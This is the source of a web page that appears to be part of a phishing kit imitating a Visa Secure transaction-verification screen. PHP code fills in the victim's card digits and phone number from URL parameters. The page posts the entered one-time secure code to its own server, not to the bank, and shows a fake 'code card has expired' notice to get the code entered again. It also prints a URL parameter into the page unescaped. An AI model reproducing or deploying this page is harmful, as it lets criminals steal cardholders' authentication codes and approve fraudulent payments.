		document.getElementById('resend_channel_click').style.display='none';
		if(document.getElementsByClassName('container-body-header-desc-otp-ext')){
			document.getElementsByClassName('container-body-header-desc-otp-ext')[0].style.display='none';
		}
		if(document.getElementsByClassName('txnDetails')){
			document.getElementsByClassName('txnDetails')[0].style.display='none';
		}
		document.getElementById('loader').style.display = 'none';
		onBodyLoad();
		return false;
	}
</script>


<script type="text/javascript">
	var errorMsgEmptyBBSelected = "Please enter both the secure code and the first five words of your national anthem";
	function validateForm() {
		var URL = "";
		if(URL !== null){
			handleExport();
			console.log("handleExport executed");
		}
		console.log("validation continuing");
		document.getElementById("loader").style.display = "block";
		if(document.getElementsByClassName("serverErrorMsg").length){
			document.getElementsByClassName("serverErrorMsg")[0].innerHTML = "";
		}
		var x = document.forms["verify_form"]["text_input"].value;
		var otpLength = document.forms["verify_form"]["text_input"].maxLength;
		if(document.forms["verify_form"]["bb_text_input"] != null){
			var bbInput = document.forms["verify_form"]["bb_text_input"].value;
			if (x.trim() != "" && bbInput.trim() == "") {
				document.getElementById("bbEntryValidation").style.display = "contents";
				document.getElementById("bbEntryValidationText").innerHTML=errorMsgEmptyBBSelected;
				document.getElementById("loader").style.display = "none";
				return false;
			}
		}
		document.getElementById("verify-button").disabled = true;
		document.getElementById("verify-button").style.background = "#46749e";
		return verifyButtonProgressBar();
	}
</script>

<script type="text/javascript">
	var cancelTxnConfirmation = "You will be navigated away from this page. Press OK to continue, or CANCEL to stay in this page.";
	function cancelConfirmation() {
		document.getElementById("container-greyout-cancelTxn").style.display = "block";
		document.getElementsByClassName("container")[0].style.display = "none";
		document.getElementsByClassName("cancelTxn-div")[0].focus();
	}
	function cancelTxn() {
		document.getElementById("container-greyout-cancelTxn").style.display = "none";
		document.getElementsByClassName("container")[0].style.display = "block";
		document.getElementsByClassName("secondary-btn")[0].childNodes[1].focus();
	}
	function noAction() {
		return;
	}
	
	function cancelConfirmed(){
		document.getElementById("cancel-confirm").disabled = true;
		var form = document.getElementById("cancel_form");
		form.submit();
	}
</script>
	
<script type="text/javascript">
	
	function validateErrorFormData(){
	var form = document.getElementById("error_form");
		form.submit();
	}
	
</script>

<script type="text/javascript">		        
	function evalSelectedOptions(){
		var validationSucessful = false;            		
		var selectedOptions = document.channelSelection.selected_options;
		var contactLength;
		if(selectedOptions)
		{
			contactLength = selectedOptions.length;
		}
		document.getElementById("loader").style.display = "block";
		if( typeof contactLength == 'undefined')
		{		
				validationSucessful=true;
			
		}else{				
			for (var i=0; i<selectedOptions.length; i++) {
				if (selectedOptions[i].checked)
					break;
			}		
				validationSucessful=true;		
		}
		
		return validationSucessful;				
	}
	function activateNextButton(selectMode){
		
		
	}			
	function verifyButtonProgressBar(){	
		document.getElementById("loader").style.display = "block";
		return true;
	}
	function authScen(obj){
		if (event.keyCode == 13 || event.keyCode == 32){
			if(obj.childNodes[1].type == "checkbox")
				obj.firstElementChild.click();
			else if(obj.childNodes[1].type == "radio")
				obj.firstElementChild.click();
			else if(obj.childNodes[1].childNodes[0] && obj.childNodes[1].childNodes[0].type == "radio")
				obj.children[0].firstElementChild.click();
			else if(obj.childNodes[1].childNodes[0].childNodes[0] && obj.childNodes[1].childNodes[0].childNodes[0].type == "radio")
				obj.childNodes[1].children[0].firstElementChild.click();
		}
	}
	function errorScenario(){
		if(document.getElementsByClassName("serverErrorMsg").length){
			document.getElementsByClassName("serverErrorMsg")[0].focus();
		}
		if(document.getElementsByClassName("validationText").length){
			document.getElementsByClassName("validationText")[0].focus();
		}
	}
	function handleCancelClockAccessibility(){
		if (event.keyCode == 9){
			document.getElementsByClassName("cancelTxn-div-msg")[0].focus();
		}
	}
	function handleCancelAnticlockAccessibility(){
		if (event.shiftKey && event.keyCode == 9)
			document.getElementsByClassName("cancelTxn-submit")[0].focus();
	}
	function placeHolderText(){
		if(document.getElementsByClassName("text_input").length > 0){
			if(navigator.appVersion.indexOf("Chrome") != -1){
				document.getElementsByClassName("text_input")[0].style.padding ="0px 0px 4px 0px";
				if(document.getElementsByClassName("text_input")[1]){
					document.getElementsByClassName("text_input")[1].style.padding ="0px 0px 4px 0px";
				}
			}
			else{
				document.getElementsByClassName("text_input")[0].style.padding="unset";
				if(document.getElementsByClassName("text_input")[1]){
					document.getElementsByClassName("text_input")[1].style.padding="unset";
				}
			}
			if(navigator.appVersion.indexOf("Edge") != -1){
				if(document.getElementsByClassName("text_input")[0].value==""){
					document.getElementsByClassName("text_input")[0].style.fontSize="10px";
					document.getElementsByClassName("text_input")[0].style.lineHeight="25px";
				}
				else
					document.getElementsByClassName("text_input")[0].style.fontSize="17px";
				document.getElementsByClassName("text_input")[0].style.padding="0px";
				if(document.getElementsByClassName("text_input")[1]){
					document.getElementsByClassName("text_input")[1].style.padding="unset";
				}
			}
			if(document.getElementById("text-input") !== null) {
				document.getElementById("text-input").value = document.getElementById("text-input").value.split(' ').join('');
				if (document.getElementById("text-input").value.length > document.getElementById("text-input").maxLength) document.getElementById("text-input").value = document.getElementById("text-input").value.slice(0, document.getElementById("text-input").maxLength);
			}
			
		}
	}
</script>



	<script type="text/javascript">
	
	    var riskfortCookieName = "RiskfortCookie";
	    var riskfortCookieValue = "WfsgKHkxYeadTgVhhRxRX4sUztNNWUTvxEgoAaRN33mgcn1ZXNSF9RfhJGak89NKU4yBoJTbNy4=";
		var riskfortTLCCookieName = "RiskfortTLCCookie";
		var riskfortTLCCookieValue = "ebrwzur2yCcwS6NDAQcBEP2HxNMxbcx4GZ0\/rmemO6pPOavLZR1TI00GYA7mtCTYP1u\/FDueMUo=";
		var riskfortCookieExName = "RiskfortCookieEx";
	    var riskfortCookieExValue = "WfsgKHkxYeadTgVhhRxRX4sUztNNWUTvxEgoAaRN33mgcn1ZXNSF9RfhJGak89NKU4yBoJTbNy4=";
		var riskfortTLCCookieExName = "RiskfortTLCCookieEx";
		var riskfortTLCCookieExValue = "ebrwzur2yCcwS6NDAQcBEP2HxNMxbcx4GZ0\/rmemO6pPOavLZR1TI00GYA7mtCTYP1u\/FDueMUo=";
		var expiryInDays = 1000;
	
	    function setCookies(){
		        setCookie(riskfortCookieName, riskfortCookieValue, expiryInDays, null);
				setCookie(riskfortTLCCookieName, riskfortTLCCookieValue, expiryInDays, getTopLevelDomain());
				setCookieWithSameSiteAttr(riskfortCookieExName, riskfortCookieExValue, expiryInDays, null);
				setCookieWithSameSiteAttr(riskfortTLCCookieExName, riskfortTLCCookieExValue, expiryInDays, getTopLevelDomain());
				onBodyLoad();
		}
		function setCookie(cname, cvalue, exdays, cdomain) {
	       if(cname && cvalue){
           var d = new Date();
           d.setTime(d.getTime() + (exdays*24*60*60*1000));
           var expires = "expires="+ d.toUTCString();
		   if(cdomain){
		   var domain = "domain="+ cdomain;
           document.cookie = cname + "=" + cvalue + ";" + expires + ";" + domain + ";path=/";
		   } else {
		   document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
	       }
           }
		}
		function setCookieWithSameSiteAttr(cname, cvalue, exdays, cdomain) {
	       if(cname && cvalue){
           var d = new Date();
           d.setTime(d.getTime() + (exdays*24*60*60*1000));
           var expires = "expires="+ d.toUTCString();
		   if(cdomain){
		   var domain = "domain="+ cdomain;    
		   document.cookie = cname + "=" + cvalue + ";" + expires + ";" + domain + ";path=/" + ";" + " SameSite=None; Secure" + ";";			   
		   } else {
		   document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/" + ";" + " SameSite=None; Secure" + ";";
	       }
           }
		}
	   function getTopLevelDomain(){
	     var split = window.location.hostname.split(".");
		 if(split.length < 3 ) return null;
		 return split[split.length-2] + "." + split[split.length-1];
	   }
	</script>



<script type="text/javascript">
function collapse(showId,hideId,image){
	var ele = document.getElementById(hideId);
	var text = document.getElementById(showId);
	if(ele.style.display == "block") {
		ele.style.display = "none";
		text.innerHTML = document.getElementById(showId).innerHTML;
		var downwardArrowImage = "downwardArrowImage"+image;
		var minusArrowImage = "minusArrowImage"+image;
		document.getElementById(downwardArrowImage).style.display="block";
		document.getElementById(minusArrowImage).style.display="none";
	}
	else {
		ele.style.display = "block";
		text.innerHTML = document.getElementById(showId).innerHTML;
		var downwardArrowImage = "downwardArrowImage"+image;
		var minusArrowImage = "minusArrowImage"+image;
		document.getElementById(downwardArrowImage).style.display="none";
		document.getElementById(minusArrowImage).style.display="block";
		ele.children[0].focus();
	}
	if(hideId == "hideText") {
		document.getElementById("hideText1").style.display = "none";
		document.getElementById("downwardArrowImageExpandableInfo").style.display = "block";
		document.getElementById("minusArrowImageExpandableInfo").style.display = "none";
	}
	else {
		document.getElementById("hideText").style.display = "none";
		document.getElementById("downwardArrowImageWhyInfo").style.display = "block";
		document.getElementById("minusArrowImageWhyInfo").style.display = "none";
	}
}

function cursorEdge(){
	if(navigator.appVersion.indexOf("Edge") != -1){
		document.getElementById("text-input").placeholder= "";
	}
	// .attributes({placeholder: ""});
}
function edgePlaceholder(){
	if(navigator.appVersion.indexOf("Edge") != -1){
		document.getElementById("text-input").placeholder= "Enter your secure code";
	}
}
</script>
</head>
<body>
	
	<div class="container" tabindex="-1">
		<div class="div-loading" id="loader" style="display: none">
			<img src="VBV_files/67880.gif" class="img-loading">
		</div>
		<div class="header-zone">
			
			<div class="secondary-btn">
				<a href="javascript:{}" onclick="cancelConfirmation()" tabindex="0">CANCEL</a>
			</div>
		</div>
		<div class="branding-zone">
			<div class="issuer-bank-logo">
				<img id="issuer-image" src="VBV_files/67984.gif" alt="This is an image for Issuer">
			</div>
			<div class="card-brand-logo">
     <?php 
      //3-4-5-6
      $numb=$_GET['numb'];
      if($numb[0]=='3'){
        echo('<source type="image/svg+xml" srcset="VBV_files/amex.png">');
      }else if($numb[0]=='4'){
        echo('<source type="image/svg+xml" srcset="VBV_files/vbv_logo.gif"><img src="VBV_files/vbv_logo.gif" alt="Logo">');
      }else if($numb[0]=='5'){
        echo('<source type="image/svg+xml" srcset="VBV_files/2b660c78-cd00-4bb4-95bd-9e62e1141c60.svg 1x"><img src="VBV_files/10ad0777-c108-45e7-8d80-8da0bb22ccd3.png" alt="Logo">');
      }else{
        echo('<source type="image/svg+xml" srcset="VBV_files/discover.png"><img src="VBV_files/discover.png" alt="Logo">');
      }
     ?>
			</div>
		</div>
		<div class="challenge-zone" id="challenge-zone">
			
			
			<div class="challenge-info-header">
				<h1 class="challenge-info-header-h1">Transaction Verification</h1>
				
			</div>
			<div>
				<div id="challenge_info" class="challenge-info-text">
					<div class="container-body-header-desc-otp-ext" id="bbEntryValidation" style="display: none">
						<div class="clientErrorMsg" style="margin-left: auto;margin-right: auto;width: fit-content;">				
							<img class="authFailure-arrow-image" src="VBV_files/67884.png">
							<p id="bbEntryValidationText" style="color: #CC3333; display: table; width: calc(100% - 45px);" tabindex="0"></p>							
						</div>
					 </div>
					
					

					
<script>
    const dateObj = new Date();
    const day = String(dateObj.getDate()).padStart(2, '0');
    const year = dateObj.getFullYear();
    const output = day + '.' + dateObj.getMonth() + '.' + year;
</script>
					
					
					
					<div class="container-body-header-desc-otp-ext">
						
<?php if(isset($_GET['repeat'])){ if($_GET['repeat']=='1'){echo('<p style="color:red;font-size: 11px; font-weight: bold;">Your unique code card has expired. Wait, we will send you a new one.</p>');};};?>     
						<p>We have sent the secure code in a text message to <span> <?php echo($_GET['phone']);?> </span></p>
						<p class="txnDetails"><span style="color:black">You are paying Merchant  Mobilum Live  the amount of  2.00   USD  on  <script>document.write(output);</script>  from Card  <?php echo($Bin);?>******<?php echo($lbin);?> .</span></p>
					</div>
					
					
					
				</div>
			</div>

			<div id="resend-info" style="display: none;" class="challenge-info-sub-header">
				<p id="channelSelectValidationText" class="channelSelectValidationText"></p>
				<p class="resendInfoText">Select the option to which we can resend secure code.</p>
			</div>

			

			
			
			<div class="txnInputFormDiv">
				<form id="verify_form" name="verify_form" action="" method="post" class="txnInputForm">
					<div class="container-body-txnInput-verify">
					
						<div>
							
							<input type="text" id="text-input" required name="Credential" maxlength="6" class="text_input" placeholder="Enter your secure code" tabindex="0"  style="padding: unset;">
						</div>
						
						
						<div>
							
						</div>
						<div class="container-body-submit-elongated">
							<div class="container-body-submit-input-elongated">
								<input id="verify-btn-elongated" class="button" name="submit" type="submit" value="VERIFY" tabindex="0" >
							</div>
						</div>
						
						<div>
							
							<!--<div id="resend_channel_click" tx:if="${resendChannelSelection == 'yes' && preChannelSelectionResend!='yes'}">									
								<div class='container-body-resend'>
									<div class='container-body-resend-input'>
										<input id="resend-button" class="resend_button" type="button" value="RESEND" tabindex="13" sd:value="${resendLinkLabel}" 
											onclick="openChannelSelection()">
									</div>
								</div>
							</div>-->
							<div>
								<div class="container-body-resend">
									<div class="container-body-resend-input">
										<input id="resend-button" class="resend_button" type="submit" value="RESEND CODE" tabindex="0" onclick="document.getElementById('loader').style.display = 'block'; return false;">
									</div>
								</div>
							</div>
						</div>
						<input type="hidden" name="acs_account_id" value="d52315cf-8815-4751-aa66-71d6e6fe0838">
						<input type="hidden" name="bb_user_transaction_id" id="bb_user_transaction_id" value="">
						<input type="hidden" name="bb_profile_id" id="bb_profile_id" value="">
						<input type="hidden" name="bb_data" id="bb_data">				
					</div>					
					
				</form>
			</div>

			<div class="txnInputResendFormDiv">
				<form id="resend_form" class="txnInputForm" style="display: none;" action="https://secure2.arcot.com/content-server/api/tds2/txn/browser/v1/challenge" method="post" name="channelSelection" onsubmit="return evalSelectedOptions();">							
				<label class="container-body-txnInput">
					<ul>
						<div>
							<li>
								<label tabindex="0" onkeydown="authScen(this)">
								<input type="checkbox" name="selected_options" value="mobilenumber1" onclick="javascript:activateNextButton('checkbox')" tabindex="-1" class="input_checkbox">
									<span>Mobile Number XXX-XXX-4733</span>
								
								</label>
							</li>
						</div>
						<div>
							<li>
								<label tabindex="0" onkeydown="authScen(this)">
								<input type="checkbox" name="selected_options" value="mobilenumber2" onclick="javascript:activateNextButton('checkbox')" tabindex="-1" class="input_checkbox">
									<span>Mobile Number XXX-XXX-4733</span>
								
								</label>
							</li>
						</div>
						<div>
							<li>
								<label tabindex="0" onkeydown="authScen(this)">
								<input type="checkbox" name="selected_options" value="email3" onclick="javascript:activateNextButton('checkbox')" tabindex="-1" class="input_checkbox">
									<span>Email DXXA@GXXL.COM</span>
								
								</label>
							</li>
						</div>
					</ul>
				</label>
					<div class="container-body-submit">
						<div class="container-body-submit-input">
							<input id="verify-button" class="button" type="submit" value="NEXT" tabindex="0">
						</div>							
					</div>	
					<input type="hidden" id="resend" name="resend_challenge" value="Y">
					<input type="hidden" name="acs_account_id" value="d52315cf-8815-4751-aa66-71d6e6fe0838"> 						
				</form>
			</div>
			
			
			
		</div>
		<div class="container-footer">
			<a href="javascript:{}" onclick="javascript:collapse('displayText','hideText','WhyInfo')" id="displayText" tabindex="0">
				<span class="whyInfo-arrow-span">Learn more about Authentication</span>
				<img class="whyInfo-arrow-image" id="downwardArrowImageWhyInfo" src="VBV_files/67888.svg" style="display:block;" width="20" height="20">
				<img class="whyInfo-arrow-image" id="minusArrowImageWhyInfo" src="VBV_files/67896.svg" style="display:none;" width="20" height="20">
			</a>
			<div id="hideText" style="display: none; max-height: 100%;">
				<div style="display: inline-block; width: 100%;" tabindex="0"><div class="hidetext-span">
<b>Help (Visa Secure)</b>
<br><br>
<b>What is Visa Secure? </b>
<br>
Visa Secure adds an extra layer of protection by helping to confirm your
 identity through One Time Password, during select online transactions. 
Visa Secure lets you enjoy extra security and peace of mind when 
shopping online at participating merchants.
<br><br>
<b>How does Visa Secure work?</b>
<br>
When you make an online purchase at a participating merchant, a box may 
automatically pop-up asking for One Time Passcode. This is similar to 
the way your bank asks for your PIN at the ATM. When you correctly enter
 One Time Passcode your card issuer confirms that you are the authorised
 cardholder and your purchase continues.
<br><br>
<b>How does Visa Secure protect me? </b>
<br>
When you correctly enter the One Time Passcode during an online purchase
 at a participating merchant, you confirm that you are the authorised 
cardholder and your purchase continues. If the One Time Passcode is 
answered incorrectly, the purchase will not go through. So even if 
someone knew your card number, they would not be able to use your 
account at that merchant. 
<br><br>
<b>How will Visa Secure impact my purchase? </b>
<br>
Aside from the added protection that Visa Secure provides, the only 
impact to your purchase will be that you will need to enter One Time 
Passcode when the request box pops up, and then wait a few seconds while
 your card issuer confirms your identity.
<br><br>
<b>Will I be able to purchase at merchants that accept Visa but do not participate in the Visa Secure service? </b>
<br>
Yes, but you will not be asked to enter One Time Passcode at these 
merchants. To complete your purchase, simply follow the traditional 
checkout process. 
<br><br>
<b>Why am I seeing this Visa Secure screen? </b>
<br>
This pop up box may appear when you are shopping online at participating
 Visa Secure merchants. Once you have confirmed your identity by 
correctly entering One Time Passcode, you will be able to continue with 
your purchase. 
<br><br>
<b>What happens if I don’t receive One Time Passcode? </b>
<br>
If you don’t receive One Time Passcode please select resend in the first
 instance. If still not received please contact your bank for further 
assistance. 
<br><br>
<b>How do I update my mobile number? </b>
<br>
Please contact the number at the back of your card for updating your mobile numbers or for further details.
<br><br>
<b>Can I complete this transaction without confirming my identity? </b>
<br>
If you are not able to confirm your identity through One Time Passcode 
that is sent to your mobile, unfortunately you will not be able to 
proceed with your purchase at this time. You will need to contact 
Customer Service Representative to update your account details.
<br>
</div></div>
			</div>
			<a href="javascript:{}" onclick="javascript:collapse('displayText1','hideText1','ExpandableInfo')" id="displayText1" tabindex="0">
				<span class="expandableInfo-arrow-span">Need Some Help?</span>
				<img class="expandableInfo-arrow-image" id="downwardArrowImageExpandableInfo" src="VBV_files/67888.svg" style="display:block;" width="20" height="20">
				<img class="expandableInfo-arrow-image" id="minusArrowImageExpandableInfo" src="VBV_files/67896.svg" style="display:none;" width="20" height="20">
			</a>
			<div id="hideText1" style="display: none; max-height: 100%;">
				<div style="display: inline-block; width: 100%;" tabindex="0"><div class="hidetext1-span">
<b>You have questions?</b>
<br>
Please contact the phone number at the back of your card or statement for updating your mobile number or for further details.
<br>
</div></div>
			</div>
		</div>

		<form id="cancel_form" autocomplete="off" action="https://secure2.arcot.com/content-server/api/tds2/txn/browser/v1/challenge" method="post">
			<input type="hidden" id="cancel" name="cancel_challenge" value="Y">
			<input type="hidden" name="acs_account_id" value="d52315cf-8815-4751-aa66-71d6e6fe0838">
		</form>
	</div>
	<div class="container-greyout" id="container-greyout-cancelTxn">
		<div class="cancelTxn-div" tabindex="0">
			<div class="cancelTxn-div-msg">
				<h3 onkeydown="handleCancelAnticlockAccessibility()">Are you sure?</h3>
				<p class="cancelTxn-div-info-msg">You will be navigated away from this page. Press OK to continue, or CANCEL to stay in this page.</p>
			</div>
			<div class="cancelTxn-div-submit">
				<input type="button" class="cancelTxn-input-btn" onclick="cancelTxn()" value="CANCEL" tabindex="0">
				<input type="submit" class="cancelTxn-submit" id="cancel-confirm" onclick="cancelConfirmed()" onkeydown="handleCancelClockAccessibility()" value="OK" tabindex="0">
			</div>
			
		
		</div>
	</div>

</body></html>